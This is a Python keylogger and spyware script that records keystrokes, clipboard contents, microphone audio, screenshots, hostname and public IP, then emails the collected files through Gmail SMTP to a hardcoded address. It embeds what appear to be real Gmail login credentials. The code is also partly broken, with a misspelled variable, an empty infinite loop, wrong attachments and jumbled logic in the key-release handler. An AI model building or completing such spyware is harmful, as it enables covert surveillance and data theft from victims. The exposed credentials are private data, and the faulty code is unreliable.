# libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "log.txt"
system_information = "system file"
clipboard_information = "clipboard.txt"
audio_information = "audios.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_log.txt"
system_information_e = "e_system file"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address ="yukkthas@gmail.com"  # Enter disposable email here
password = "bqyv hedp czao mrmz"  # Enter email password here


username = getpass.getuser()

  # Enter the email address you want to send your information to

key = " "  # Generate an encryption key from the Cryptography folder

file_path = "C:\\Users\\yukkt\\PycharmProjects\\pythonProject\\python"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend

toaddr="yukkthas@gmail.com"

# email controls


def send_email(filename,  attachment,  toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


send_email(keys_information, file_path + extend + keys_information, toaddr)
send_email(screenshot_information, file_path + extend + keys_information, toaddr)
send_email(clipboard_information, file_path + extend + keys_information, toaddr)

# get the computer information


def computer_information():
    with open("system file", "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


# get the clipboard contents
def copy_clipboard():
    with open("clipboard.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


copy_clipboard()

sample_rate=44100
duratiom=10

# get the microphone
def microphone():
  audio_data = sd.rec(int(sample_rate * duration), samplerate=sample_rate, channels=2, dtype='int16')
  sd.wait()  
  write(audio_information,sample_rate,audio_data)
microphone()


# get screenshots


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

from pynput.keyboard import Key, Listener

from pynput.keyboard import Key
import pynput

count = 0
keys = []


def on_press(key):
        global keys, count,currentTime

        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


def write_file(keys):
        with open("log.txt", "a") as f:
            for key in keys:
                f.write(str(key))
                f.close()


def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


        if currentTime > stoppingTime:
         with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

         screenshot()

         with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

         if currentTime > stoppingTime:
          with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


